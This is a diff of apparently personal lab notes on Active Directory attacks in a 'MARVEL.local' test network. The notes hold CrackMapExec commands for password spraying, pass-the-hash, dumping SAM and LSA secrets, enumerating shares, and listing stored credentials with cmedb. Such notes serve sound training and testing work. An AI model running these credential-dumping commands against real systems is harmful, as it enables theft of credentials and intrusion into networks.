@@ -62,30 +62,30 @@ To define a module just do `-M <name>` at the end, eg: `crackmapexec smb 192.168
 
 
 ### Trying to pass the Password
-`crackmapexec smb 192.168.13.0/24 -u fcastle -d MARVEL.local -p Password1` 
+`crackmapexec smb 192.168.13.0/24 -u fcastle -d MARVEL.local -p Password1`  
 
 ![Pasted image 20251203210113](images/Pasted-image-20251203210113.png)  
 
 
 ### Trying to pass the hash
-`crackmapexec smb 192.168.13.0/24 -u administrator -H NT:LM --local-auth`
+`crackmapexec smb 192.168.13.0/24 -u administrator -H NT:LM --local-auth`  
 
 ![Pasted image 20251203235324](images/Pasted-image-20251203235324.png)  
 
 -> Dump that hashes from pwned machines:
-`crackmapexec smb 192.168.13.0/24 -u administrator -H NT:LM --local-auth --sam`
+`crackmapexec smb 192.168.13.0/24 -u administrator -H NT:LM --local-auth --sam`  
 ![Pasted image 20251203235611](images/Pasted-image-20251203235611.png)  
 
 
 -> Enumerate shares on pwned machines:
-`crackmapexec smb 192.168.13.0/24 -u administrator -H NT:LM --local-auth --shares`
+`crackmapexec smb 192.168.13.0/24 -u administrator -H NT:LM --local-auth --shares`  
 ![Pasted image 20251203235758](images/Pasted-image-20251203235758.png)  
 
 
 -> Dumping LSA:
 `crackmapexec smb 192.168.13.0/24 -u administrator -H LM:NT --local-auth --LSA`
 - Some secrets are good some are not
-- may try to crack DCC2 Hashes offline that we get from here
+- may try to crack DCC2 Hashes offline that we get from here  
   ![Pasted image 20251204001353](images/Pasted-image-20251204001353.png)  
 - These passwords might change though, the hashes could be old
 
@@ -106,7 +106,7 @@ FOUND NOTHING
 
 
 -> Using CMEDB
-`cmedb`
+`cmedb`  
 ![Pasted image 20251204005020](images/Pasted-image-20251204005020.png)  
 - hosts - list of all the IP addresses used in crackmapexec
 - creds - dump all the creds that have ever been pulled before
